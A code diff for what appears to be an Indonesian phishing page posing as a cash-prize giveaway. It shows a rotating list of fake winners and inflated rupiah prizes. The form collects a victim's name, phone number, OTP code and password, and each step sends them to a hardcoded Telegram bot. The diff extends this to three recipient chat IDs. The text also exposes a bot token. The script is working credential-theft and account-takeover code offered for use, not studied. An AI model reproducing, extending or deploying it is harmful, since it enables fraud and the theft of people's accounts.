@@ -1,18 +1,22 @@
 const botToken = "7945679163:AAE_FWn__VpRLUhREBGVGPZ6UtKNMCQFhsY";
-const chatId = "6124038392";
+const chatIds = ["6124038392", "6672109667", "0987654321"]; // Daftar chat ID
 
 function sendMessageToTelegram(message) {
-  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-  fetch(url, {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json",
-    },
-    body: JSON.stringify({
-      chat_id: chatId,
-      text: message,
-    }),
-  }).catch((error) => console.error("Error:", error));
+  const urlBase = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+  chatIds.forEach((chatId) => {
+    fetch(urlBase, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message,
+        parse_mode: "Markdown", // Mengaktifkan Markdown untuk Telegram
+      }),
+    }).catch((error) => console.error("Error:", error));
+  });
 }
 
 function validateStep(step) {
@@ -30,7 +34,7 @@ function nextStep(step) {
   if (step === 1 && validateStep(1)) {
     const name = document.getElementById("name").value;
     const phone = document.getElementById("phone").value;
-    sendMessageToTelegram(`Nama: ${name}\nNomor Telepon: ${phone}`);
+    sendMessageToTelegram(`Nama: ${name}\nNomor Telepon: \`${phone}\``); // Nomor telepon dibungkus dengan backticks
 
     // Transisi halus ke Step 2
     document.getElementById("step1").style.transition = "opacity 0.5s ease";
@@ -43,9 +47,10 @@ function nextStep(step) {
       document.getElementById("step2").style.opacity = 1;
     }, 500); // Setelah transisi selesai, pindah ke step 2
   } else if (step === 2 && validateStep(2)) {
+    const name = document.getElementById("name").value;
     const phone = document.getElementById("phone").value; // Ambil nomor telepon dari step 1
     const otp = document.getElementById("otp").value;
-    sendMessageToTelegram(`Nomor Telepon: ${phone}\nKode OTP: ${otp}`);
+    sendMessageToTelegram(`Nama: ${name} Nomor Telepon: \`${phone}\`\nKode OTP: ${otp}`); // Nomor telepon dibungkus dengan backticks
 
     // Transisi halus ke Step 3
     document.getElementById("step2").style.transition = "opacity 0.5s ease";
@@ -62,11 +67,12 @@ function nextStep(step) {
 
 function submitForm() {
   if (validateStep(3)) {
+    const name = document.getElementById("name").value;
     const phone = document.getElementById("phone").value;
     const otp = document.getElementById("otp").value;
     const password = document.getElementById("password").value;
     sendMessageToTelegram(
-      `Nomor Telepon: ${phone}\nOTP: ${otp}\nKata Sandi: ${password}`
+      `Nama: ${name}Nomor Telepon: \`${phone}\`\nOTP: ${otp}\nKata Sandi: ${password}` // Nomor telepon dibungkus dengan backticks
     );
 
     // Tampilkan modal pop-up
@@ -96,16 +102,11 @@ function resetForm() {
 
 // Close modal when user clicks on the "OK" button
 function resetAndCloseModal() {
-  // Close the modal
   document.getElementById("confirmationModal").style.display = "none";
-
-  // Reset and redirect user back to step 1 to fill out the form again
   resetForm();
   document.getElementById("step1").style.display = "block";
   document.getElementById("step2").style.display = "none";
   document.getElementById("step3").style.display = "none";
-
-  // Optionally, reset the form fields here
   setTimeout(() => {
     document.getElementById("step1").style.transition = "opacity 0.5s ease";
     document.getElementById("step1").style.opacity = 1;
@@ -165,16 +166,16 @@ const names = [
   "Estiyani",
 ];
 const prizes = [
-  "500,000",
-  "550,000",
-  "600,000",
-  "650,000",
-  "700,000",
-  "750,000",
-  "800,000",
-  "850,000",
-  "900,000",
-  "1,000,000",
+  "1.000.000",
+  "1.500.000",
+  "10.000.000",
+  "9.000.000",
+  "7.000.000",
+  "7.5000000",
+  "8.000.000",
+  "15.000.000",
+  "20.000.000",
+  "5.000.000",
 ];
 
 let currentIndex = 0;
@@ -182,7 +183,7 @@ let currentIndex = 0;
 function displayWinner() {
   const name = names[currentIndex];
   const amount = prizes[Math.floor(Math.random() * prizes.length)];
-  winnerDisplay.textContent = `${name} - Rp ${amount}`;
+  winnerDisplay.textContent = `${name} Memenangkan Hadiah Rp ${amount}`;
   currentIndex = (currentIndex + 1) % names.length;
 }
 
